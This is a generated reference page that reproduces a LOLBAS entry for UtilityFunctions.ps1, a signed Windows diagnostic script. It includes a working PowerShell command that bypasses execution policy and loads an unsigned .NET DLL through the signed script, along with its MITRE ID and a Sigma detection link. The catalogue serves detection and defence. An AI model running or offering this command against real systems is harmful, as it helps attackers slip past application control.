---
parsed_by: focuslocust
source: lolbas
type: generated
---
# UtilityFunctions.ps1

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `utilityfunctions.ps1` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/UtilityFunctions.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [UtilityFunctions.ps1](../../tools/windows/utilityfunctions.ps1.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | utilityfunctions.ps1 |
| name | UtilityFunctions.ps1 |
| type | tool |
| source | lolbas |
| url | https://twitter.com/nickvangilder/status/1441003666274668546 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@nickvangilder'
  Person: Nick VanGilder
Author: Jimmy (@bohops)
Commands:
- Category: Execute
  Command: powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module
    .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
  Description: Proxy execute Managed DLL with PowerShell
  MitreID: T1216
  OperatingSystem: Windows 10 21H1 (likely other versions as well), Windows 11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  Usecase: Execute proxied payload with Microsoft signed binary
Created: 2021-09-26
Description: PowerShell Diagnostic Script
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml
Full_Path:
- Path: C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1
Name: UtilityFunctions.ps1
Resources:
- Link: https://twitter.com/nickvangilder/status/1441003666274668546
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSScripts/UtilityFunctions.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml
```
